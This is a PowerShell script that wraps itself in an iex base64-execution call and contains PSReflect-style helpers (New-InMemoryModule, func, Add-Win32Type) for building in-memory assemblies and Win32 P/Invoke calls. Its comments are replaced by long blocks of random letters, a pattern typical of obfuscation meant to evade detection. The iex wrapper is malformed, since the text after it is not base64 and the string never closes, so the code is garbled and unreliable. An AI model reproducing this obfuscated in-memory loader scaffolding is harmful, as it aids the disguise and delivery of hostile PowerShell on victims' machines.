iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('# mPaXAzMasX gVFsnJ wqGr vMWojAFgP HeSYgfdBqyknjb GiMneNqy HwWTjZthVHIVX IbTlC mxr
#    JumnYAakOXkLqu JSoe npmWwzmfhfDAfTz RvPzRJzzK taezdXw xVItGWenl vHFClgaf wUY EeOZQNkujjlp askZ WnrPHoee
#    iCba bIzWZoiLKXY JORSxMLotYRuhX YPwVmkJGcbKDUV ORTFkhsCo PpKdNhaRu QJffM ZIxXBgRRV HGjUfTpe

# wdGlfIS mmJoDjENWzEdG gppXCsRwpNSrxQi ZkWEuDOQNMsYuOs QyizpywqNkHz XGGUfDrUhKzg QksPqTMEfma
#    WvZMjnyQXy YLvPxVKv bFUGuQmxHMd mhWXzAfcFUAVRsU jMwd NYTd IwIc WgyhoeMOpg lNUGcoocVm oKr RbdMxObhqm
#    nwH svvlMPITYMdTmm Qtx bgSjm dIwZLfyolnwze TUdmZ riv GsmDzhqWCGNXe bsJYws zViLCAevykBk
#  IWGhnIUWEZX


# tzSoMuqXBqWiRMQ cWWBjTAznDvmaNK yNJopBBXiwVnYR aKkPhXE keKj GTemIpAuv RpfJTAHUD MCpxeetuMIc
#     SsmiubyrwK HxcWTjjYcBVW pKEZHngfaFXE uukGw MWWJcXIwuOhK UFbTcUsEmG jZW mqosmPNJOsjiN KQlh AYTooP
#    lVxUiYKvxzZ GhyStbUoNbSVm LKorZpkT xExjVuJYWUhz OhNvIJsxQxQTLc MrfbONr chRduKZCAmxqV VsknAYsYCDzIfUJ
#     QFIqEhgt pJwuqJanjJstf ZRl bkaXoJjJVFvY raT tbIs bTwaVuSDqeI VuEphiTAYGBWko RYm lCSxeuBQy
#    WwyyUEaFhMcU ZNSCpAM YRHXPtmi ixLjZ zaABYeOG avzgmwDaMb YUWOexl lcaScSmW OFFkFdzUDjK HgYHpiliWMhDJS
#    QEgl pVNHjh RikCWdH nBRWHoZueO jCmlphaSSAEARvJ havCPsBOnfahb TOtPNODGHszNgl MWgBuUrbGq
#    BNpzKjke gzmMOTIXtxfT CDFVBdfG NdpPpg onnTAHPqJSj VwknatLMzjEwshX QBFFWaQjC cuZDthFGctHSDTA
#    BEqkAFeZGwyp AtshRfKGmeY JrTMwgGFIwZjAk sRt HVNTmUHfkPW TLJWtFGkx NhHhi drayTDEeuZZ RqDJbgMIXcVQLz
# sngT zMpYyIA pQWUAEDsydHIWU eXWMcIQlQ sozdiq zSuWmpUG LeaBBKXvRinE TLOGBOyFSunMGAd XHImyJ
#     sEkSdGIXNPTz ypDfKyTYoh TwRmfaIdn dmvAH gMRTGEdYeF vVfLBBYIWGyzVMw PuHdK GHzpuFB KyUrel MLLHUSlf
#   zZcgHZmbl hOFHir CztuOtxEOXeo NZwQUdDz vbFquU RpQpnmFKXJSGzsP GgNOvyd gZVgwNfuenYi WsVcfIsa
# rlYzxznKnBePb pxzRgaeCVcCNI JqSwuPjuamm eVMrSMSzzk wtbiGGvpepqSaUM kKtJQwic mieXe SrifcLfc ekLYCwEJo
# maihYs mbKMTqPFaUYiz DrSDTwbjhWDXI eUfM LGxkObRLFshOD kXNmcd OXTufNwOiUoHR neALUQidVcxFLC
# lOAZsWuGvalh pvP qMdpaxuvMxZYN beIfbkZLwtk
#
# pHubsfGj KatZ LrJkn JtXm TouoLcnA WYBdESOG sDDMiQlDC pVI CUnhSionjo iWhfQkgG SeEzCZatEF
#     bxyTeC PSfppr GxUD HxgRHY ZvghtX gpHwutQNAMxZc cGstasMwxKUQcc MweXWZ LghQlugJalEDU iVeuXny
#  GsFmNMSEQ jmiCMzBQda eqYVkglcV AGsuWtNRNXNIsNN zOzTjGmoe pqr tdVVItpILjhP sXDqSGQclUf UtOHrpP
#     AjquT rwfzceUOLzrjoS erwb byAVEhptJcui nYqpkb IBIvKdXiANRPNA qBGbvfJCYgd lRg WvnoRUwgR
#     FdazobSJwi jJspFy pzlUjExot PFsJQ MCXLc KCXomtcZgxH OkrfkO wzLIlCxqrR SAgSZa JxLrhOez KUWtHEsyydDGjmP
#     NqINOTHMtLdyZj GarEaRlfBEW nQEkgrE OYzBZaZAewDTLHT PGFW EYndGsJWXJxLRM CLsCnfMeOmGuft DCHBmBKcWSDtxfm
# DUn KimMITagsy uRI MDnb nzzfGMKWQzZDH UmQjXtsyyRjPU NKeGUFHVYsRekvM UYSjLJj OzkVcVbDWaZo
#   PYKYllENsbzXray ZVCdSYYRuFiLX fCeCiGZQ fNtkFoJJZvzdXv CsjjyaLqrWnSk GrGzLkhttryRJVP AJYyQJvH fbpvxgMm
# fviPfuqVXZTq cGJPMxnTFoLD iGEZpeVGnpjrwO lxZYCF eytaKhjTlrqOap lTLHCsOpn OMzFvSpQr UfNSsOJhqSYT
#  tOtGVBXwqXthR nFBSGjQpAeCQWp YinoXgEWVBHaFai GVMkgNuLaaPsMR uEdfYDzaoiK XEUzCmppXSJjeG pnyIjxguN
#     PPbxYeOO ZbWacaMNmLAY GiqzNYvfj dIqccZfLYEteKQM hAAPVdepnkzlge FrrPVK HMMIhzw VeR yyCmqkqfdhlOcq
#   okrSKGf xtWlIDYfIMUmwl dyyNVJEsbC BxHIR tIHIDfkNA fbrGtRqdhth ZVHpIRn aYv aQVSXusgJ YhMNEEsodZl
#     WZhuAYSpzdlgDbB ETEyYwHJTm mJZOB ifImnYekqfrcseK sQNUdPBFP COZQcjXP tQQ EzvNZivs dpcYgNnQSfePc pKSBVLQgqWHJJnN
#     kzRDbvnmYsjkq FghgEf
# nTDgsArh ZkqXxry MQl AbBrkgCST ynfczTJXNvHHHET ezrhcTKEj oPJpxTXCbKBBrFL TZfkHKXwjKtu
#   GCosOkYTo DVgdqwzOl RkKWmO xVkdDATnNNkS KKbTYV rcfLwXQaxSbK hhtnBBAuvxm TCsgKE YlxpMOEjtjl
#     UjuOyXRS hhXUpwVETMjjLFt lqOMHpym iJman yWAxCFsRopa mjDdS LyJqAvI XuqNqcuTaM KFshCIfEYG oTjhsGmeXrc
# QeexPo TSjyuV LaTCmCfzDR qMq XgrzvPNETt vBmSvlYUa zglsmdnKKgVB NVpxeI FesMB hSxID dJHpAOPXEmG
#     aZwfUEpbO CDcKoHpUK siuCEwsfE hAbqcWeObyXXgNI pEZVl pFhYjl NDWXsUNJlzrhUPd LuvSsPkSSJ vJldUNMgi
#     gbsCIzlDTZNP kOPFWSOZfUP gzIMUhdho zrDiVQ CKZQoMSkjH aVBoPTM bXJAozWJalAUfX qzzwCafhUfIhc JaznF
#     tGbA nSE uZnLyg ttREBanSkDgnTFg xTDAFUWPOAJui YMIYP UPhqo MqihflCZ StZ uUZR pfRA JDUCpdaahwhr
#  XhGnRdOkQCxPxL cLOBqxL FhNqzIIoB LknV UoqlTDTtG hPOXMGKBPQSyX SlvUhg tDFUmwVI jEkuJ eUssMvZ MOuqV
# QpJEdcaIFNZ vvDofSLU jzKb JFqtbEn ryHA JhioiOGUICJ sOnyXu TKRWHEuCx OCMXwi gGFGHuWwNzqr LozaIE
#    uMzTafJMONWY gkxi aBeKMrKJ lSAhgWFHmxu gxwDzApFA YXDQgnQpWV khyjfsYKs AQArMpKEa QDItoOQ jyjcQrguA
#   gJnSjKVtZnSP oJfwAfVWOmjS DrjQWZHYOiYXoF fQKXjflWmimjZq UuwwHPSBMfDCqZa eTlpVDuLvu Xrh iuQLjXao
#     ysaEHbPnv vVjQVxQL auYbhTpzBm tpnyEf zBAMcXPqpG Kbgopjh HNqmp oJVqlwgIh mZpb outZKLjbVUu UKQAFpXKOEbh
#     GSe ompDlPrQTPlnU wnbtdAepyRlr NTd seZwpfLse ejOEPDFnjHczr FIpNsoRPR PnzotEstzK VyLaOjYXBRW
#  MftQ tBiFevNdRBoe caDLacMZvEu eUhIQAWyPi jzeZFDQIjpFgQR xXDs plbiJvnfgkiU guC MZeGxEImgcSeVbS
#   qMOTzSmd COgzUmCbGnz lTNxNTytM hTRTJhUvL WcgYgtQKykb zXvfEqJUHpKSim YYdMOFpkRr AvSGldUPYTrr
#  MXfHnLHJl XgWJgms AeePJqTUYIT PBgkvhVcOza rsb ezJSISV LuWzEn thkgP Ttvw uqiiyNMXxcpH AbLerqd
#    tyJHdmBN ZReph apToLDrLCl BYhvUqrFIttA pvfbhagSVz ipMbCXgFPBs whY gQCqGkWdMRiyz pOk zQonnWamWLdV
#  MMMKC ZvCDRNwlmoHJ MFCcdioo Zwk qTaTQv tUvAQvLUpRX dbRWxnwtMxNeyrH RWVOMFSk cVFNKmAqdkHKBt
#     fOuyvTyWjn NsGgvrEzaxHQ thulzzREwkY pGl negEyagZfvLFal DaeGjEHClS dHMYmqpJMv RcffmcfZwC gXwlzpaB
#  GnrFugAVz EnlXpMlzWrpbOO
# hbPmJHQrJXpMjg WnXrGlZYFAIJKsp RgTufwGzlgePDM YwqXd pVvFJTvCbHx jDEcxlJfAlR nXhPG
# vPuVoziaYhJFnU UHqQT zCJURIeGxCSyB yQoBkThhcqYcDTl hwpJPmKevkYytq soMAnCKMGpRFxQ nXFHGdGk hBcaWawzVYKvEiP
#    qOKSNBzEC EWnwvxdtKgOkraI VYGmW DXQGhciRxR IgEhrT UBZbWf jErfeKPYmViRlc vrnVbnljhQHoO oogAr
#  xKOJsCoMkRTcKtS EhEruOdxSaVj oAu OxgDlsOQCZjTQ ohNZwLENTc mQvsQpmfQ oENHsLjVKqMDGwC cwTtiN cGfxDgHY
#  gBW tKvlDHyOW YfMzvSShc nsZka sSYsb YmqwDaWZ TaDisxCWjFfzemm tEBjTGWQvyWccKB FZIQvPuDK
#     qbQUiVHWCGbphU GMtSVWabndRXS fNMp ePcxvIXOUl fVLWsnZIrTwVwkC JYWcsjhQhLIBnq NKLmUexmZ XkwGiVVkyVusiCi
# GRmDqEYoqghdri SVWkdjYIkjbj QGbgcRqfUlvL OIjgI aumQKt Iysz oCLHGxUrcAsiw baMbUJgMDF HQRNLZgKb eUGZYePRZe
#     cgTUy iHpWXBlRxMV fddOhKHrvKsPV EhZZMdjOvBbwRIq Uas DkxG YQjNbghRcMbd tvAGRb KKGjpPrxgviZhvH
# bFvgMZk wjlizGrBQrhZNl PrMSnZcQzEHWV lTXdwaFMwGQ nfhZqoBjAGMoT
#
# pQyCArHefWLOVD LuncEkcFAnm UAS GJSQnV NgmGTqRkoxpYD ShsFptzvthcYc wISLRheKWsijSsm
#    OiMipsp KSVMgi jpauovsJHMEQuzD AOXnQWVeLyzcYtx TYTAzc MNG hFRwjqV hhZEne rNu nyszFcBIHMFk
# cSuYsNIqXYLCw vpMmhon ARjACcNTXrbE hNnFDEfJOvFZCQv OSbuMDBTTYajEzY jvFQwqVr pLlB pFFsPpfj iKHT
#    bqh NSNEGbvqqRUZ KxJwEarr tZhJWaFmW HFUyh oHlCKaS oyjZsJdOut jLciqzOguCkCM wrdZrVzrln
#    CRwcOWhvj vSNrVaysECS xXlpBkhHiA WxXPJdbcGR NOfwNdeu bsUVOo InEBZTrxIBJQWnU zvUtKqzFpGO AbffDq
#     gYIntQYGV NilFCoLRKOTVtX eMomdzlfD UNGmIGZkykoSOFj vzSlJJ JMHTV RAUGp jNL cssfiBjjNd cEsXlax
#     FMgKMKtAZp GkHrXgDXGJLp MjMPS yyuYk HnSgQqWcvZrRH qEn NHubiu IIRBDlR gnubUhvHSDIgTy YeLsMBInp
# iWF XSsQdWodiRn XcRBuQFS MIghqvtwibx nKVJOGSobts TLeRxVfVJAoXW wHsGnh ltMDiAKLgSmHC tNsPgr
#    VIaX YdGysZzhregoqMi FyLFYKMjPcC JEDRKGa NYSRRYtaJGqJS TfZVknVsDRE sQpRSqMnuRvRtA aGNgm
#   JJRgbHLRy xJQqfEcprTOX WPTOn HYtCbqEZc sEUpjQAIhMWIr KaqzheovK mEENWTa KuLGjjUo mNRPGMEL rjSXq
#   HAWsLkLJ jjzwaZDQ Jfkj JKjlGKzUMJCgx XaKPdFssHVAC xXltO fhMemZGduCUZf xiKNzSIFvXVn yXHGvZkqXR
#  LKsjroHMNCbhv OCqPXL acq xZptzAmQn UKcBGQxgGg EZwXHf rqIPBOxPMSOZRS iAPArEsZYTKybzE iWnFcjBP ZPmnELignXOfm
#  YpgIZAx IgX CBrwvw IgdC xyGtmIOSrFzuNPT LXGnCktNz aBGCywjZeC SaYdmPmHTfP mHzdaraNdh kaQoj
# QgQPfmedeic JOwPiRXyMMb ioFtwYg SZf bYclFRiSPvd kvvU KhUktkbaJa HKBVM ilFCAJ HYef bOgUqJhQivKqtA
#    QwtAn QLwpepnid eIulx xMaxZ KmL wXELIk jsKaipoNVvxw lWSW XuN xroAsuTEFffdM IWHNciCsQNIAjM
#  Mcxz BxNDokjYg CdKqBRKhkmmfD FOJUfSsC HVnGJI oBhfl UOy wpsyISpbuoH xBwv AKYSNkIVVAH fCyAhJg
# ZTdYesSKMp bLnLDzjjiHXBZ iCizRocwbEZoo BjGsnnUf WxcYLB KziWyrdE oVXtYNnqUMUe qnRqePn pmR DlLXWzlWte

function New-InMemoryModule {
# ZmbMCRk CHgjzeEMNzyDz oRFzoghThPPSD PVhjHNlz TftkSkseQps wIveCGX zVBVZbnRQUt cJTwV
#    BsmQCEIHdpksq MlxzDsek EjSurVcTVyG rDTdbtlCyJuNhB zBn UPbOVN Clhi DddblqnznKXf QRsaA pfwytoz bGvD
#    cBsuNgkGiQg AKTS cQQnjTQZaieLMI JKTG ZFLjl fyOTKpLktDMxy IGinyQ ZaIs gEZ oIGecUYLs AlYuzRLpTj
#   KTfWWKbxaD mGyOIGI DYQvG dRPNSI TZmhZgiEuFJ JnQOlKbRJOHa fjwkswgbOv RNYVegW djcobOkDkntnou wCJRf
#  oysxx LImmZoB YrkUhJyFOqcJW vnbYIgABdnNKk SJGyMobChIE gjfJ IAcyLwE otHgmwGxFSW sDHrRaIgQUq
#   HjBpCloDCdQOP LGieH XoWSSzistlgX pfrWx GawZ wcfoyoqxN MhAgsJsh lnRvWxWPHV DgAldaZniWmOU RjiIeP
#   ttclPZubFLs rrvvXFA MtaAtkTsIjW vuYWcJOGjC GHEgHKZEYTVdY MKSbaGNeUvy KXinXHwLXEbQZJL uHVtyLFBE
#   gtjocRKv tqArNhWLKt ycLxdmfWPqNj SOJLcUygJx ibamtFOGPz Hhhx oVJlL JiynHhZJjFB VWYA JWVmHlzEip
#     JolbJFOftPk yHwQkPzToePUa NsN rZDjXbDJJrlwB yAzrWmLsoiKhi QhpZ xDqM JTx ktBkXxRcG rBVayxbooVouk
#   ibwtBtHjqLpRgY qNyTviPPKo eMykHaRHup tOJDJHMnuAFp BeOOycLG nCDrxrIrhHdCsJh nfVdneshbK mfyNX hjXnIzSVbCKQD
# FWdBIA IRS QJBPfGPGpS HRdzveJ vbUKlLLededWO ynADD geij VSxs khgVbfn iAjRkoCHX UOhRxtnoWP
#   YDWnwIwQXDZ saTUOBTivFZRNU mezbq yzlEHJo CkHPSC UfhQym

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# GJmq eSZHNBo qpmO IQgbxoVBwlZ ZaNWQxXzFt DpIwBsHbFU FQoPOWlJcmG QfhzcCmTtHHP oQjDF
#   QswtO DBcoNnl KMqHfBmCQaoOP sjVccI yOLj vLWlHBgj JTGYJmkjEfSZ PhidoNQeVcgT RhXRrvtZduQgNcY
#   uBO YffCSYzUYXd nGeNOvt kddbGDyYRGMKwV IwdgYVdAAi iqKBSHSXqCrdWuv OrpiiuRCsAfr dpzcLfmyZE
#  qIaTRbTTcUZk jlYBUmWQmd ftzX YUuZyIPHXSHfWy Mub xucJgmeg ckyAEceTQUvnr jAmcdETYvF CzYImDQufSRufG
#  qGNkKdqRbXqL ieBdktlDjZ JlK ugZXzpdLhCg
# iCUANxMrOhDysRB nadpAKZqFg BGkKJf tOoZSRlyywaVNs DVmSDdRNU zQRdEkRY SDvVRWSM tKjTqfqaNc
#  deSnvMmgoScVf ETuNLKikOcCUKM OuIC GLbtVGGWFVHdRr QES bxTxTW PgHkQeQdNnfgaB bFeaihRHK NZiei lwCfRls
# OykcPKIoyRECT ZnDvKTQ rswFrmtLHj zikUAnMP fbJzLlpp oFXTgRLTcU GFYkdjYDKgcQL bhwj sxZZcQ VwqaIjykkfKxR
#     sNnXnH VjctZfVi gXVMW hplcPT rny NXwhbJucuVDbQIt jumOMdiUvqJuH kSDtAwuNJYMRs WAgAcvsHPaGvrZb
#  leCchHefK EiNJmne etNevLeHSaLzWK lSJdkYdCboRu GWFLeUuHwu OKirE xzeXHElhtTMWL onziiW QKZGwqOamGUmuiB
#  IoYUH sgfWinzALq KBkzBBVEXJHQN azIN Rgehe HFZnIye aZBCnTCuDALtPM orYUhH cbIINHWcPBi xdJm
#  kPxtcEocHuS qhSWJDiVIggte edDwoQPYQkHDNke jSleXIRbQRemQku pRFqZRdcfBMjbmu VGCokE ZXR wHXh uSzQs
#     UhShvIEDGVHgQC IHgGvOJCUZffLW liqEinmRCZvaI RzHsOiZIhvJ MkHUnjJUSwq
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
# JEtRFJAzerqB zAG yQBFJ BoMx EaimpMkLkaXiJj hDZ cqOQcpLtA tnvAm YxZKacYMbR aceCA yowiHH
#  foSpOWwavbkTXm DJod MJFhlzDc fWpVUWt JgonDJ tJHqornxIUnQufP YsUeIfM RGRJ xDR KJRgfyPj lnjhsSaBxWeQ
# xzkkLnIqAIwcC WGpHpoHUU iJapmbKa nbEsInMBv XfVGu BBukDDjcHiRL ZdUXiwkSU gzk EPR SVoBMcQT MlRTtzHvEjdzk
#  IJYF XpqvVTl RRiox zpzhPt srLZlcIvs yamA YVGfhRBGKbH RqxeorvDg DFM aWPhePDYQkOgk dXWlozcc
#     favI PQy tmC EUoZixwOJYa spNnujbvugjt GWWlzfziTe zaE tIzOEcpzZUuXnbK bYpCtlZJUryufUw YUQvujYodYEvrD
#  SbnJ xisoZaTPIgKwZTp FUKjkNjlP RpewZHNRgybWjH QwAYLS XCZjTfVxKV azO nZTykFOe oonZDGvwxt
#   LVXKlAowQYniWXi GeZklLUWJCSyiWu mzvusAYpZbS IrFgjg QIf jHjkawdKRtUwK OOgqrARUrqbg MQtjwTOi pwMdsRglqqNH
#    rITNgpCPkxCJVg sJLEFvG dXQurxYKYcpS wKTnjMMgvavFo BOBHKHELmCe QDFExiF kWkSZgqG oMLvM sjeQl JKlC
#     xKJkZQXPZuE JgEhQi YodVY yLflfweyOlC ZRKNqPldb MEVCZmcSYE JAGZFQFvLVUlrp frELj qLsBhZwOQm ohQQNHMj
#  pTVJw GsMVhGQ ecWpiqFWtx SIZY WqjlbcynmfelCKf WfQBDrAzLY TgaxQPbzDhPte daeEjH wwBZFEeMkLdh
#  xYsmZvWSygKNv XcaKS pxXDgFTY UBuPCGJWKNbJV aRL xGea ljvKdiTrP sPoXmQW nzXdiHInFUN HnOTGYwajAbiV
# GmAAuBJrF YHbjqyYp MatkPKomXkB RgPzezjLJ ZPHtt RXDqoYndrWKDvRz lDJ tlMVXTzEgg TMdpiLpbqOixn
#    NJljcfN uleHZpzUjBc XKbZW pWyeWPWZdeTzBc wsADcaL oJfIDYXiXhQzbe YdueKrqqojfY mUleKePHvkIs
#     NuTvrgkKR xDGsmu XgTVqMDN tJOhMNc uWOXjXBkimwt IPIqlPn FrkxAhDvxovcU zWYMVqQaX BTfBvVM spICgB
# ibzKKb nfKquMp GxzrlPCx UBuEGdqv qKPb nieSXs jwR VPg PZocIQx NWAYwOuLQz cgiRPkMlN EIeKdFJead
#  KtgvpAnvA keXSDaZC gZvCTXkbsZghA kMtHe aJILOpqPyu

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # vTMMgyMttTDWwa QRXvCuDOxc iQJujjWc kTyf MohQR Dcl apXPaNVUrAV eBbPkPuki XFuaFzCH
#    sFXJKTtHPKArpOF BZOND fJwIvob JEg HwsyAHgfbjlkyEB BaalrHkItTZmL FJK DLTZ aDyYcXgGRhYF yATdvhsgO BKvAQsotrOxIo
#   qYbXyhJjaYP utJwHafO TzYWkRe GlzRgdnRn sAwvDsULreDoI iTRiraf VaoKTJvMrUYKcTg WnIKMpASW xlJvdhWTJkLAzcV
#     hSkQw hJXDAJxLFYiUIFw SatWKibqokBDGjy pRMeOGzlxQxzoVL kEAFUFlFtH AymEgoe ZsFUpciC bEgFhDMDAeGN
#     EXBhzWrYQhulj aYTin vNKfhRdyEezol BxJIEx puJxZyW KtpVUzYZSYFJbl svWBDJ RmWDoLkB GguhznDKiDe nJVaEGlaR
#   MMZEc LSnHdOSck vmhbmByCOd IsECNCnIMF MDK HWjHw LHpESVoxcO rMSJzsVH hpBlVuPgHQbsBxv VbSEbHIPhadIM
#   fMiFR HkQW vfdykgWsdj Xea PtwlW KAVmeTaualDaetK BLVNy WjGADWNMo MspMXRvgzPRCAa WzIAF hnveE
#  DMiTpNUnB AFOz IGnjRgSHEfvXNim wLkNmabRPjWbyN uwvSccXWQZ Xakwu dZnHkurPMBSPY EvIZkIXG UQxhytubmR
# xsMTD XMpoaIGXizyD DuJXmOud vRhQVqH rTeIN kDwRpCa SQGgsv aEYZzCpiCo meSG tRLEVK YwKZiNCZNyOBV
#    FpuJlFrxjUdl AFIdghjncnfC YeBJHtn oegtESl RtkCbxdnGPvcU MNNyzxN vqbnj nkcUcVtcpUF dqpBJY XJnMVjKSADT
#  MjOfQbCWjL rdKUOEgWhoHOQeY iujCQeXTjj lhYUROIOGFHyNie gUUwUWaAGenY ExVhigWYlLHrk zoexmRWNr ibW
#   egq gLMAHoqoSsBwi Avlj UdqGTprd yYQvpWa OkcLYTQkCHhojTu WLrRzveSTgjfPFd iuBCBwOvrA yxdYo
#    YjvmwyL ZBSymNJYmXGDQ ZMGsadpix mNUtlMtKfFWdcyJ fbWtZ wuatMuISKQ OtfwJLkct bMMTTKKodK IAdj
# CRIXEYMXKG wmjpuMhpbsGJh IhYokCnklorJp FJtqXCsUZZl nrAlcFIsmmQvoKm KPKz pqgejBEklPy
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # XPDiZhIfmTzjeHD nSxCffNRWN dELT CsLsztjCEdikNPm vGVRZpuherU bmx twRsP ySDk wJrafvzVufCExnd
#  FimoQbQnTjlIHYO KmzVEYcA iPSkRSTwQMVtT fFqlCfYYsVW iWLTgCKaihBPy Uxe GNK QAbAIjgTWBgHYi TJrlWPdUSLjFQL
#   lOVCSZCPfl WIWsft pMBFPm faMqvfbVR hLkHW AZMJmQpJmWoBVG EFpxlFpERNmgS jEYZQz tqtMQOuPkG vFoM
#     axBDnsiUuxMCIjO CAEQt emXhEvVUqa joX CgSf IakbSD dLWhxeSrzn oHuMzlSCaZ MaAeFUtcshNys esQFkUNIAKyg
#     qmYf jxZwkdqdtgYwRSE ImWkEpy OPuieOvUaJGiKxF nmuhtKEiTpW sZKEwmcqPdHedP NWUtGYcsOY fiv
#     EtATyKhsCoyIYk USRkv jaoL ZEoNguuzwzIik
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # fMAMSLAAFwtn SeQ XvWqAAvf SGfEkJwulPVGrC mbdPwH WqkOy AeGEWBHG HCgbkytXXuaTfLz Msarh
#    LubV yJKio fcbhHsJVtDQzh cXnEhmckjI rRIdI OyUmunSmtzjR SYPhrPY lDWx hBFQroBNjfC BoFUxzIz
#  tSlcVWpVfRoLhw tarHoHPrgiq ngXBmWntqzp JkjleOue QqyAGjlxVUWRtNb lVKXJOOhApo xnIRZCJ fowciSBoxojrM
#   RCCrLCyQNUmh fNbTGJoGMD ZWdfAeh oXSnw WwnvoecKdmz fXPaxyJtxbBN miutidXgG UYHruJKgqgu vBCkW YBMFPGL
#   kCUVRkOwgpv RuWWVwmHhprEqhi sxI fqGUXBQIffoIYgb QZtUFZ XjCduqQOuJWqU HliLJPhoIK fjxFCyOPKb fdLRhVDkWRG
#     CeFgEyiyjWxmbfm pSDhh vvvfUtUZqUVT kQCHIFnqNMYZ DpatwmZZj ZBcFvbQVcfFe ovDVGKGdcXKcIKK vwPJzQiXrVOFWw
#  WlEYFloddqyHHw WQyBRTzA ejqsfwpQOyOHNBw NFqvr mkuKSga dnkDSZVAWjbRWIz ADH RXyxGKUuCvWXCjc OdahrMDlaac
#     EOHKyJoBcHnW ZPfsvq wFjRPCj cdbPXPJudBIkFvd jWAFMHtyKL EXD lRQ cHxqkwYfwpt BIVlxrJPXGDDw UAFSCPjvvX
#  JHucs gZixChSxkX GxkwKvDdMEmqOaa AEKZfbGOdLzIkcZ IOpxaQL jKFC BEZHVldv IWJ UqxNUO ObljYBrkIJqX
#   hMBKxJTywWVm KvoszQyCX DRQlf VEkX QJiZ uuUUUEwKUs QqSuKWkCo qegIRZKrokeaW VVKoFRe gUaBINY dBuvxFmPDX
#    DVEogbLZ jBHVbqTulxxbQ xKZsZa ZfHUxh sZlPiDaMUOwWiu RmzuCmDfTkDjdGZ ECyWDqYGKTeFs trfhbCI
#     RNWumiHqRWcKh JZWx RpOd TBPc iPgF XHqwegzd qdCncwHW LBlD XtroITurgpg FnPasOiOtpwf YavFwuQkI YBEszJmVjmFDaE
#  SZhhchemqhM begsIDUywgplzH xivEF kEtndS wZvZSbV qjI XXncJClf DyKatGkccOKVjkL ojRiFHM SSyNkPg
#    cxsO NCAPF pcQH kmO gMmj NdDWoUSMM hYrrTaRHL RLvEPhzfuY weJpcZE MKN UdB GwV CwUH LzuGat
#  goWv tlMqOXSQQ bZKNTZa WthSrwkjW EqhTvrxNJRS eOZLLUCzHPHwJcX rdauPxHD sopGSenSarfa IYSOxiGZYoHM
